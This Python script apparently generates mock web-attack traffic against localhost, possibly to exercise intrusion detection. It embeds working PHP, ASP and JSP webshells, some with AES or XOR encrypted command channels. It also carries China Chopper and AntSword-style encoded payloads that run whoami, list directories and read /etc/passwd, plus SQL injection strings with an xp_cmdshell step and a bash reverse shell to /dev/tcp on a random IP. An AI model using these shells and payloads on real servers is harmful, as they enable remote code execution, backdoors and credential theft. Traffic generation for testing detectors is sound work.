import requests
import random
import base64
from urllib3 import encode_multipart_formdata
from urllib import parse
import time
#mock webshell_upload  SQLI webshell_useing
#
webshells={1:{'fn':'123456789.php','fd':'<?php @eval($_POST[\'666666\']);?>'},
           2:{'fn':'123456789.php','fd':'<?php @system($_POST[\'666666\']);?>'},
           3:{'fn':'123456789.php;jpg','fd':'<?php @system($_POST[\'666666\']);?>'},
           4:{'fn':'123456789.php','fd':'<?php\n@error_reporting(0);\nsession_start();\nif (isset($_GET[\'666666\']))\n{\n    $key=substr(md5(uniqid(rand())),16);\n    $_SESSION[\'k\']=$key;\n    print $key;\n}\nelse\n{\n    $key=$_SESSION[\'k\'];\n	$post=file_get_contents(\"php://input\");\n	if(!extension_loaded(\'openssl\'))\n	{\n		$t=\"base64_\".\"decode\";\n		$post=$t($post.\"\");\n		\n		for($i=0;$i<strlen($post);$i++) {\n    			 $post[$i] = $post[$i]^$key[$i+1&15]; \n    			}\n	}\n	else\n	{\n		$post=openssl_decrypt($post, \"AES128\", $key);\n	}\n    $arr=explode(\'|\',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n	class C{public function __construct($p) {eval($p.\"\");}}\n	@new C($params);\n}\n?>'},
           5:{'fn':'123456789.asp','fd':'<%\nResponse.CharSet = \"UTF-8\" \nIf Request.ServerVariables(\"REQUEST_METHOD\")=\"GET\" And Request.QueryString(\"666666\") Then\nFor a=1 To 8\nRANDOMIZE\nk=Hex((255-17)*rnd+16)+k\nNext\nSession(\"k\")=k\nresponse.write(k)\nElse\nk=Session(\"k\")\nsize=Request.TotalBytes\ncontent=Request.BinaryRead(size)\nFor i=1 To size\nresult=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))\nNext\nexecute(result)\nEnd If\n%>'},
           6: {'fn': '123456789.jsp', 'fd': '<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter(\"666666\")!=null){String k=(\"\"+UUID.randomUUID()).replace(\"-\",\"\").substring(16);session.putValue(\"u\",k);out.print(k);return;}Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>'},
           }
UA={1:'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
    2:'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74',
    3:'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Tablet PC 2.0)',
    4:'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17'
    }
HADER={
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
'Accept-Encoding': 'gzip, deflate',
'Pragma': 'no-cache',
'Cache-Control': 'no-cache'
}
chopper={
1:'pass=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&z1=L3Zhci93d3cvaHRtbC8%3D',
2:'pass=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyAneyRzfSciOiIvYyB7JHN9Ijskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIpOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=L2Jpbi9zaA%3D%3D&z2=Y2QgIi92YXIvd3d3L2h0bWwvIjt3aG9hbWk7ZWNobyBbU107cHdkO2VjaG8gW0Vd',
3:'pass=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyAneyRzfSciOiIvYyB7JHN9Ijskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIpOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=L2Jpbi9zaA%3D%3D&z2='
}
raw={
1:'pass=@eval(system(\'whoami\'));',
2:'pass=%40ini_set%28%22display_errors%22%2C%20%220%22%29%3B%40set_time_limit%280%29%3Becho%20%22pass%22%3Btry%7B%24D%3Ddirname%28%24_SERVER%5B%22SCRIPT_FILENAME%22%5D%29%3Bif%28%24D%3D%3D%22%22%29%24D%3Ddirname%28%24_SERVER%5B%22PATH_TRANSLATED%22%5D%29%3B%24R%3D%22%7B%24D%7D%09%22%3Bif%28substr%28%24D%2C0%2C1%29%21%3D%22%2F%22%29%7Bforeach%28range%28%22C%22%2C%22Z%22%29as%20%24L%29if%28is_dir%28%22%7B%24L%7D%3A%22%29%29%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D%28function_exists%28%22posix_getegid%22%29%29%3F%40posix_getpwuid%28%40posix_geteuid%28%29%29%3A%22%22%3B%24s%3D%28%24u%29%3F%24u%5B%22name%22%5D%3A%40get_current_user%28%29%3B%24R.%3Dphp_uname%28%29%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3B%7Dcatch%28Exception%20%24e%29%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage%28%29%3B%7D%3Becho%20%220a5f4%22%3Bdie%28%29%3B',
3:'pass=cat%20/etc/passwd',
4:'pass=@eval(system(\'id\'));',
5:'pass=@eval(system(\'system\'));'
}
uppaths={1:'upload.php',2:'upload',3:'?/upload',4:'?mothod=upload',5:'?c=upload'}
sqlipaths={1:'news.php?id=',2:'?id=',3:'search.php?name=',4:'login.php?name=',5:'?c=edit&m='}
sqlis={1:'1123%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20WLTU',2:'1123%20AND%202662%3D3538',3:'1%20and%201=1',4:'3498%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23',5:'1123%29%20AND%205039%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285039%3D5039%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%288775%3D8775'}
shellpaths={1:'images/',2:'upload/',3:'config/',4:'static/',5:'js/'}
def gen_str(mode=0):
    table = 'abcdefghijklmnopqrstuvwxyz0123456789'
    if(mode==1):
        table +='ABCDEFGHIJKLMNOPQRSTOVWXYZ!@#$%^&*()'
    return ''.join(random.sample(table, random.randint(4, 8)))
def webshell_upload(url='http://127.0.0.1/'):
    url+=uppaths[random.randint(1, 5)]
    data = {}
    sn=random.randint(1, 6)
    data['file'] = (webshells[sn]['fn'].replace("123456789",gen_str()), webshells[sn]['fd'].replace("666666",gen_str(1)))
    encode_data = encode_multipart_formdata(data)
    requests.post(url,data=encode_data[0],headers=dict(HADER,**{'User-Agent':UA[random.randint(1, 4)],'Content-Type':encode_data[1]}))
    print ("webshell_upload")
def SQLI(url='http://127.0.0.1/'):
    url+=sqlipaths[random.randint(1, 5)]
    url+=sqlis[random.randint(1, 5)]
    requests.get(url,headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
    print('SQLI')
def webshell_useing(url='http://127.0.0.1/'):
    mode=1
    print('webshell_useing')
    chopper_mock(url)
    raw_mock(url)
def chopper_mock(url):
    url += shellpaths[random.randint(1, 5)] + gen_str() + ".php"
    requests.post(url,data=chopper[1].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
    requests.post(url,data=chopper[2].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
    requests.post(url,data=chopper[3].replace("pass",gen_str())+parse.quote(base64.b64encode(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode())), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
def raw_mock(url):
    url += shellpaths[random.randint(1, 5)] + gen_str() + ".php"
    requests.post(url,data=raw[random.randint(1, 5)].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
    requests.post(url,data=raw[random.randint(1, 5)].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': 'antSword/v2.0','Content-Type':'application/x-www-form-urlencoded'}))
    requests.post(url,data=gen_str()+'='+parse.quote(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode()), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))

def randomIP():
    a= random.sample(list(range(1,256))*4, 4)
    b= map(str,a)
    return '.'.join(b)
def Make():
    url="http://localhost/"
    switch = {1:webshell_upload, 2:SQLI, 3:webshell_useing}
    mode=0
    rm = 1
    while 1:
        if rm == 1:
            mode = random.randint(1, 3)
        switch[mode](url)
        time.sleep(1)
if __name__ == '__main__':
    Make()
